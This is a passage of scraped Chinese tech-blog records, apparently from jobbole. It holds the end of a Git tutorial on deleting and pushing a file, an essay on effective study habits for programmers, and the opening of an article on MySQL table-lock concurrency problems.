class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nrm file.txt\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee6159792722605-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee6159792722605-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ee6159792722605-1\"><span class=\"crayon-e\">rm </span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee6159792722605-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>如果你现在做 <code>git status</code>，Git 就会说有一个文件 <code>not staged for commit</code>（未筹划提交），并且它已经从仓库的本地拷贝中删除了。如果我们现在运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ee615c752277700\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit add file.txt\r\ngit status\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee615c752277700-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee615c752277700-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee615c752277700-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ee615c752277700-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">add </span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee615c752277700-2\"><span class=\"crayon-e\">git </span><span class=\"crayon-i\">status</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92ee615c752277700-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>我知道我们正在删除这个文件，但是我们仍然运行 <code>git add</code>，因为我们需要告诉 Git 我们正在做的<strong>更改</strong>，<code>git add</code> 可以用于我们添加新文件、修改一个已存在文件的内容、或者从仓库中删除文件时。实际上，<code>git add</code> 将所有更改考虑在内，并将这些筹划提交这些更改。如果有疑问，请仔细查看下面终端屏幕截图中每个命令的输出。</p>\n<p>Git 会告诉我们已删除的文件正在进行提交。只要你提交此更改并将其推送到 GitHub，该文件也将从 GitHub 的仓库中删除。运行以下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ee6162743948317\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit commit -m \"Delete file.txt\"\r\ngit push -u origin master\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee6162743948317-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee6162743948317-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee6162743948317-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ee6162743948317-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">commit</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Delete file.txt\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee6162743948317-2\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">push</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">origin </span><span class=\"crayon-i\">master</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92ee6162743948317-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p>现在你的终端看起来像这样：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/a702fafff9bde602d93411167d94710b.png\" alt=\"\"></p>\n<p>你的 GitHub 看起来像这样：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/4d86c6b7db708b054256542492880b21.png\" alt=\"\"></p>\n<p>现在你知道如何从你的仓库克隆、添加、修改和删除 Git 文件。本系列的下一篇文章将检查 Git 分支。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114104\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114104votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114104\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Git,Linux", "url": "http://blog.jobbole.com/114104/", "url_obj_id": "2fd3e1a536854e3343b73dcb02097713"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2016/09/cfb878cc788ffd38bb744dd98d83c4fb.jpg"], "title": "如何高效学习", "create_date": "2018/05/22 ·", "praise_num": 2, "fav_num": 8, "comment_num": 3, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://zilongshanren.com/blog/2017-05-09-learning-how-to-learn.html\">子龙山人</a>   </div><div id=\"table-of-contents\"></div>\n<p>IT 行业是一个变化非常快的行业，它需要我们持续去学习新的知识和技能。 但是，工作以后，我们经常会发现自己学习的东西很少了，倒不是没有时间去学习， 而是学习的效率太低了。久而久之，就演变成『一年的工作经验，重复用十年』。</p>\n<p>当然，有些人会说自己经常加班，没有时间学习，这只是表象，时间挤挤总是有的。 你想想你为了上王者，浪费了多少时间？为了刷今日头条，又消磨了多少光阴？</p>\n<p>另外，很多人推崇碎片化学习，但是有一些东西碎片化学习效率是很低的，比如数学。</p>\n<p>这篇文章是我学习完 coursera 上面的《Learning How to Learn》MOOC加上我自己多年来的学习经验积累整理而来。</p>\n<p>注：文中可能有一些内容思考没有很深入，另外一些观点可能还需要更多的时间去检验，读者请自行甄别。</p>\n<p> </p>\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"1-一些学习的坏习惯\"><span class=\"section-number-2\">1</span> 一些学习的坏习惯</h2>\n<h3 id=\"text-1\" class=\"outline-text-2\"> <span class=\"section-number-3\">1.1</span> 被动反复阅读</h3>\n<div id=\"outline-container-sec-1-1\" class=\"outline-3\">\n<div id=\"text-1-1\" class=\"outline-text-3\">\n<p>通常编程新手在学习一个新东西的时候，喜欢买一本权威指南之类的书（大神或者同事推荐），比如「C++ Primer」和「Javascript 权威指南」。 而这样一本书，一般页数在700-1400页左右，要完整读完，在不求甚解的基础之上大概要花费好几个月甚至大半年时间。 别说是新手，就算是一个C++编程老手去读「Javascript 权威指南」这样的书也不可能在只阅读一遍之后就能理解。 这时，很多人会选择重复多次阅读。有人会从头开始重复阅读，也有人只挑不理解的章节来阅读。 我以前上大学那会儿就是这么干的，读了好多C++的书籍，其实自己编写的C++代码并不多，也没有做过大型的C++项目。 看了好多书，其实都是一知半解，效率很低。工作以后，这种学习方式更加不可取，因为你没有那么多时间这么干。</p>\n</div>\n</div>\n<div id=\"outline-container-sec-1-2\" class=\"outline-3\">\n<h3 id=\"12-喜欢在书上划重点\"><span class=\"section-number-3\">1.2</span> 喜欢在书上划重点</h3>\n<div id=\"text-1-2\" class=\"outline-text-3\">\n<p>很多人偏好纸质书，因为在看书的时候手感不错，另外，还可以在书上把喜欢的句子和重点的段落用彩色笔标注出来。 这样做除了给自己造成一种假象「书上的重点我都标出来了，所以我都掌握了」之外，其实并无多大益处。 我现在喜欢在电脑上面看PDF，可以边看边写代码。</p>\n<p>读书的时候，还有一个误区，就是大脑被动地跟着作者的思路在走，如果是一本经典的书，你会每每被作者的真知灼见所震惊， 一种「于我心有戚戚焉」的感觉由然而生。如果作者的书写枯燥乏味，估计看几页你就丢到一边去了。在看书的时候，头脑中要 有自我意识，要感觉自己在跟作者对话，对于作者的观点不能一味全盘吸收，可以看一会儿，停下来，问几个为什么。</p>\n<p>另外，我并不是说划重点是不好的，只是划重点的效率没有想像中的高。划重点有点像收集资料和网页链接，在你收集了一大堆PDF和视频教程之后， 你会得到一种满足，但是这并不代表你真正学到了东西，这个是要非常警惕的。</p>\n</div>\n</div>\n<div id=\"outline-container-sec-1-3\" class=\"outline-3\">\n<h3 id=\"13-看书中代码示例认为自己就理解了从不动手编程\"><span class=\"section-number-3\">1.3</span> 看书中代码示例认为自己就理解了，从不动手编程</h3>\n<div id=\"text-1-3\" class=\"outline-text-3\">\n<p>这是新手学编程的大忌，不去动手写，不去跟编译器和开发环境做斗争，你永远不知道软件开发过程中的操蛋事情。</p>\n</div>\n</div>\n<div id=\"outline-container-sec-1-4\" class=\"outline-3\">\n<h3 id=\"14-拖延\"><span class=\"section-number-3\">1.4</span> 拖延</h3>\n<div id=\"text-1-4\" class=\"outline-text-3\">\n<p>这个问题最大，也是影响N多人不去学习的理由。解决的办法只有一个，马上去做！一旦你开始去做了，你的大脑就不会排斥了。 你的计划再完美，你选的书籍再经典，你挑的视频水平再高，如果你不马上去看，去学，去动手实践，那永远也只是停留在空想的阶段。 成功学习的典范就是成功战胜拖延症的典范。</p>\n</div>\n</div>\n<div id=\"outline-container-sec-1-5\" class=\"outline-3\">\n<h3 id=\"15-学习任何东西只停留在编写hello-world的水平\"><span class=\"section-number-3\">1.5</span> 学习任何东西，只停留在编写「Hello World」的水平</h3>\n<div id=\"text-1-5\" class=\"outline-text-3\">\n<p>这个是什么意思呢？不是说你真的只会写「Hello World」，而是说要跳出自己的舒适区，去尝试一些自己不了解的领域，去做一些超过自己能力范围的事情 。</p>\n</div>\n</div>\n<div id=\"outline-container-sec-1-6\" class=\"outline-3\">\n<h3 id=\"16-喜欢加qq群和微信群美其名曰技术交流\"><span class=\"section-number-3\">1.6</span> 喜欢加QQ群和微信群，美其名曰「技术交流」</h3>\n<div id=\"text-1-6\" class=\"outline-text-3\">\n<p>这是国内技术圈的一大通病，可能刚开始会聊点技术，但是时间一长就水了。好好的技术群一秒钟就可能变成水群。 而且经常还有老司机冒然发车，此时马上有人冒出一句「留图不留种，菊花万人捅」。</p>\n<p>我强烈建议大家不要过渡依赖Q群和微信群来学习技术或者解决问题，技术论坛，Stackoverflow 和 Github issue是你更好的去处。</p>\n</div>\n</div>\n<div id=\"outline-container-sec-1-7\" class=\"outline-3\">\n<h3 id=\"17-天天熬夜打王者和lol睡眠严重不足\"><span class=\"section-number-3\">1.7</span> 天天熬夜打王者和LOL，睡眠严重不足</h3>\n<div id=\"text-1-7\" class=\"outline-text-3\">\n<p>实践证明，睡眠不足，啥事也干不成，只想睡觉。有人会说我晚上不到那个点睡不着，我这里有一招。 拿着一本 Kindle，挑一本英文书，躺在床上看，半小时保管睡着。虽然说看书的效果不一定佳，但是催眠也是极好的。</p>\n</div>\n</div>\n<div id=\"outline-container-sec-1-8\" class=\"outline-3\">\n<h3 id=\"18-工作中遇到模糊的问题不搞清楚停留在面向-google-编程\"><span class=\"section-number-3\">1.8</span> 工作中遇到模糊的问题不搞清楚，停留在面向 Google 编程</h3>\n<div id=\"text-1-8\" class=\"outline-text-3\">\n<p>遇到问题，不假思索「百度」和「Google」，虽然现在80%的问题都可以找到解决方案，但是这样做对于自己并无多大益处。 找到解决方案之后，还要花几分钟时间探寻问题根源。可以查找背景资料，以便自己下次遇到同类型的问题时可以举一反三。</p>\n</div>\n</div>\n<div id=\"outline-container-sec-1-9\" class=\"outline-3\">\n<h3 id=\"19-看几分钟书敲几行代码就开始刷知乎和朋友圈\"><span class=\"section-number-3\">1.9</span> 看几分钟书，敲几行代码就开始刷知乎和朋友圈</h3>\n<div id=\"text-1-9\" class=\"outline-text-3\">\n<p>做事情不专注，注意力不能集中，这也是学习的大忌。可以利用番茄工作法，给自己一段时间专注于某件事情，这样可以极大地提高 自己的工作效率。</p>\n</div>\n</div>\n<div id=\"outline-container-sec-1-10\" class=\"outline-3\">\n<h3 id=\"110-从不看书所有问题的解决方案都从论坛q群和google中来\"><span class=\"section-number-3\">1.10</span> 从不看书，所有问题的解决方案都从论坛，Q群和Google中来</h3>\n<div id=\"text-1-10\" class=\"outline-text-3\">\n<p>认为看书效率太低，而且收益也不高，看书需要大量的时间，而且看完感觉也没太大的用，不如直接Google和Q群来得容易。 如果你真的这样想过，我只想说「小伙子，你思想很危险！」</p>\n</div>\n</div>\n</div>\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"2-一些学习的好习惯\"><span class=\"section-number-2\">2</span> 一些学习的好习惯</h2>\n<div id=\"outline-container-sec-2-1\" class=\"outline-3\">\n<h3 id=\"21-与其反复阅读不如经常回顾\"><span class=\"section-number-3\">2.1</span> 与其反复阅读，不如经常回顾</h3>\n<div id=\"text-2-1\" class=\"outline-text-3\">\n<p>与其一遍又一遍地阅读重复的书籍，编写同样的「Hello World」，不如有意识地总结回顾看过的书，学过的知识。 只需要每晚趟在床上的时候，回想一下今天都学到了什么？今天自己有进步一点点吗？</p>\n</div>\n</div>\n<div id=\"outline-container-sec-2-2\" class=\"outline-3\">\n<h3 id=\"22-多做练习多写代码从错误中学习\"><span class=\"section-number-3\">2.2</span> 多做练习，多写代码，从错误中学习</h3>\n<div id=\"text-2-2\" class=\"outline-text-3\">\n<p>看技术书籍要多写书中的代码，在初学阶段哪怕对着书本敲也没有什么问题。认真完成书中留的习题，在自己没有尽最大努力的情况下面不要去看答案。 不要怕犯错，每一次犯错都是自己进步的机会。不断地测试自己是最好的学习方法，不管是「刻意练习」还是「10000小时定律」，都要求我们通过不断地 实践来巩固我们的所学，从而让自己成为大师。</p>\n</div>\n</div>\n<div id=\"outline-container-sec-2-3\" class=\"outline-3\">\n<h3 id=\"23-多总结问题的解决方案多写可复用的代码拒绝复制粘贴\"><span class=\"section-number-3\">2.3</span> 多总结问题的解决方案，多写可复用的代码，拒绝复制粘贴</h3>\n<div id=\"text-2-3\" class=\"outline-text-3\">\n<p>每天把工作中遇到问题的解决方案总结一下，想想为什么要这么做，是什么导致了这个BUG，导致BUG的根本原因是什么。 是自己的逻辑混乱，粗心大意，还是程序框架太复杂？做需求的时候，要尽量避免复制粘贴，不要让代码里面有重复代码。 Don’t Repeat Yourself! Don’t Repeat Yourself! Don’t Repeat Yourself! 「重要的事情说三遍！」</p>\n</div>\n</div>\n<div id=\"outline-container-sec-2-4\" class=\"outline-3\">\n<h3 id=\"24-对于自己想要学习的内容制订一下计划有节奏地学习\"><span class=\"section-number-3\">2.4</span> 对于自己想要学习的内容，制订一下计划，有节奏地学习</h3>\n<div id=\"text-2-4\" class=\"outline-text-3\">\n<p>我是一个非常爱学习的人，但是有时候还是感觉学习不够高效。经常会由于一些突发情况把原本的学习计划打乱，导致学习效果打折扣。 因为学习一个东西最怕三天打渔，如果能够持续地学习一个东西，我可以把它学习地很好。这时候，我就得结合我自身的情况，选择一段最佳的 学习时间，在这段学习时间里我可以不被打扰，保持高度专注。比如每天早上6.30起床看一个小时书。</p>\n</div>\n</div>\n<div id=\"outline-container-sec-2-5\" class=\"outline-3\">\n<h3 id=\"25-尝试使用不同的方式来解决一个问题\"><span class=\"section-number-3\">2.5</span> 尝试使用不同的方式来解决一个问题</h3>\n<div id=\"text-2-5\" class=\"outline-text-3\">\n<p>在遇到一个没有显而易见解决方案的问题时，你可能费了好大功夫想出一个方案，但是千万要记得，该方案不一定是最优的， 而且很大可能还存在一个更佳的方法。而这个方法只需要你退后一步，换个思路，或者与同事讨论一下就可以得出。 这也是我为什么非常喜欢别人 Review 我的代码的原因，因为别人能看到我代码中存在的不足。另外，有些时候，对现有的方案做一些 「微创新」也能使原本普通的方案变得不普通。</p>\n<p>另外，习惯了面向对象，何不尝尝函数式编程？每年学习一门新的不同范式的编程语言，可以极大地开拓你的眼界，给你一些不一样的解题思路。</p>\n</div>\n</div>\n<div id=\"outline-container-sec-2-6\" class=\"outline-3\">\n<h3 id=\"26-注意劳逸结合\"><span class=\"section-number-3\">2.6</span> 注意劳逸结合</h3>\n<div id=\"text-2-6\" class=\"outline-text-3\">\n<p>多参加体育锻炼，多去户外走走，运动能够增强人的记忆力，并且有时候还能产生灵感。 如果身体不好，比如颈椎不好，下了班你就只想葛优躺了，因为你的本能告诉你，我不能再写代码了，会挂的。。。 想要成为大神，身体好是前提条件。有人30岁成为大神，我资质不好，我35岁成为大神总可以吧。 切莫在30岁的时候就把身体弄跨了，然后35岁转行了，永远失去了成长为大神的机会。</p>\n</div>\n</div>\n<div id=\"outline-container-sec-2-7\" class=\"outline-3\">\n<h3 id=\"27-向别人解释你的知识多与人讨论\"><span class=\"section-number-3\">2.7</span> 向别人解释你的知识，多与人讨论</h3>\n<div id=\"text-2-7\" class=\"outline-text-3\">\n<p>多写博客，多分享自己的所学所思，这些对于学习者自身也是非常有益的。通过用别人能够理解的语言来解释你学到的东西， 本身就要求你对该知识充分理解。另外，很多人经常感叹「跟你讨论一下，我马上变得有思路了」，这其实就是交流的作用。</p>\n</div>\n</div>\n<div id=\"outline-container-sec-2-8\" class=\"outline-3\">\n<h3 id=\"28-保持学习的专注\"><span class=\"section-number-3\">2.8</span> 保持学习的专注</h3>\n<div id=\"text-2-8\" class=\"outline-text-3\">\n<p>很多知识没有足够的专注力和足够多的时间是很难学好的，保持学习的专注尤其重要。 因为人的大脑在专注模式下面，神经细胞更活跃，你学的东西更容易从短期记忆变成中长期记忆。 而且在高度专注下面，你的解决问题的能力也会提高，原本看起来复杂的东西，在专注面前说不定就不是事了。</p>\n</div>\n</div>\n<div id=\"outline-container-sec-2-9\" class=\"outline-3\">\n<h3 id=\"29-找到自己的短板并补足自己的短板\"><span class=\"section-number-3\">2.9</span> 找到自己的短板并补足自己的短板</h3>\n<div id=\"text-2-9\" class=\"outline-text-3\">\n<p>发现并找到自己的不足相对来说是比较容易的，但是要补齐短板就非常不易了。 因为人总是有畏难思想的，拖延症是怎么来的，就是你的大脑出于本能去做一些让自己分泌更多多巴胺的事情。 如果自己英语不好，就要下决心把英语攻克。如果自己数学不行，就要下死力气掌握数学。 补齐短板就像渡劫，越早渡劫，越快升仙。</p>\n</div>\n</div>\n<div id=\"outline-container-sec-2-10\" class=\"outline-3\">\n<h3 id=\"210-给自己设计学习奖励\"><span class=\"section-number-3\">2.10</span> 给自己设计学习奖励</h3>\n<div id=\"text-2-10\" class=\"outline-text-3\">\n<p>比如学好了 3D 数学，就给自己买一台顶配 MacBookPro 之类的。为什么游戏可以让你上瘾，因为它有反馈，有奖励机制。 学习数学是非常枯燥的，如果有了这个奖励机制，也许自己就更容易坚持了呢。</p>\n<p>PS：这一点对于有家室的程序员有用，你想学好什么，要获得什么奖励，你可以当着你老婆的面立个FLAG</p>\n</div>\n</div>\n</div>\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"3-小结\"><span class=\"section-number-2\">3</span> 小结</h2>\n<div id=\"text-3\" class=\"outline-text-2\">\n<p>Coursera 的这门MOOC 《Learning How to Learn》 强烈推荐给每一伴热爱学习的小伙伴，也欢迎大家给我留言，分享你的学习感悟。</p>\n</div>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114034\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114034votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114034\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 8 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "职场,学习", "url": "http://blog.jobbole.com/114034/", "url_obj_id": "4138e1905de02770bdfcad265c9040f4"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2015/11/e78e36715813f49e9e62fe0c6050075c.png"], "title": "MySQL 在并发场景下的问题及解决思路", "create_date": "2018/05/11 ·", "praise_num": 1, "fav_num": 2, "comment_num": 1, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/leefreeman/p/8286550.html\">李平</a>   </div><p>1、背景</p>\n<p>对于数据库系统来说在多用户并发条件下提高并发性的同时又要保证数据的一致性一直是数据库系统追求的目标，既要满足大量并发访问的需求又必须保证在此条件下数据的安全，为了满足这一目标大多数数据库通过锁和事务机制来实现，MySQL数据库也不例外。尽管如此我们仍然会在业务开发过程中遇到各种各样的疑难问题，本文将以案例的方式演示常见的并发问题并分析解决思路。</p>\n<p>2、表锁导致的慢查询的问题</p>\n<p>首先我们看一个简单案例，根据ID查询一条用户信息：</p>\n<p>mysql&gt; select * from user where id=6;</p>\n<p>这个表的记录总数为3条，但却执行了13秒。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/1b3bc1912c404382512e2792c1aae040.jpg\" alt=\"\" width=\"517\" height=\"149\"></p>\n<p>出现这种问题我们首先想到的是看看当前MySQL进程状态：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/04c5328df90da59e81538e413a6214e9.jpg\" alt=\"\" width=\"612\" height=\"127\"></p>\n<p>从进程上可以看出select语句是在等待一个表锁，那么这个表锁又是什么查询产生的呢？这个结果中并没有显示直接的关联关系，但我们可以推测多半是那条update语句产生的（因为进程中没有其他可疑的SQL），为了印证我们的猜测，先检查一下user表结构：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/890dfd75e286048c8572d90a7e54d8ee.jpg\" alt=\"\" width=\"613\" height=\"385\"></p>\n<p>果然user表使用了MyISAM存储引擎，MyISAM在执行操作前会产生表锁，操作完成再自动解锁。如果操作是写操作，则表锁类型为写锁，如果操作是读操作则表锁类型为读锁。正如和你理解的一样写锁将阻塞其他操作(包括读和写)，这使得所有操作变为串行；而读锁情况下读-读操作可以并行，但读-写操作仍然是串行。以下示例演示了显式指定了表锁（读锁），读-读并行，读-写串行的情况。</p>\n<p>显式开启/关闭表锁，使用lock table user read/write; unlock tables;</p>\n<p>session1:</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/0290d1fdfbfda4149bdbe0391d3e5710.jpg\" alt=\"\" width=\"607\" 